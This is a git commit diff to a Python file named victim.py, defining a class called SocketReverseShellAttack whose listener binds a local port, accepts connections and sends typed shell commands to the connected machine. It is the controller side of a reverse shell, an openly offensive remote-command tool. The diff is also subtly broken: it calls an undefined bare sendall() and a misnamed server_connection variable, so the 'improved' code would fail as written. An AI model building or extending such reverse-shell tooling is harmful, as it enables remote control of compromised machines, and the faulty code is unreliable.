a3649c3f49786578f41195581314d9bf8fe4145b
JrDev <josemanuelramirezrengifo9@gmail.com>
2026-07-08 22:49:24 -0400

    Refactor victim.py for improved socket handling

--- victim.py
+++ victim.py
@@ -17,17 +17,27 @@ class SocketReverseShellAttack:
         print(message_descriptor)
 
         command_send = input('Ingresa un comando (escribe "exit" para salir): ')
+
+        if command_send == "exit":
+            connection_reverse_shell = sendall(command_send.encode('utf-8'))
+            connection_reverse_shell.close()
+
+            return False
+
+        connection_reverse_shell.sendall(command_send.encode('utf-8'))
     
     def receive_connection(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind((self.HOST, self.PORT))
-            s.listen(5)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+            server_connection.bind((self.HOST, self.PORT))
+            server_connection.listen(5)
 
-            while True:
-                conn, addr = s.accept()
+            running = True
+            
+            while running:
+                client_connection, addr = server_connection.accept()
                 print(f"Conexión establecida con: {addr}:{self.PORT}")
-
-                self.command_inyection(conn)
+  
+                running = self.command_inyection(client_connection)
 
 if __name__ == '__main__':
     HOST = "127.0.0.1"
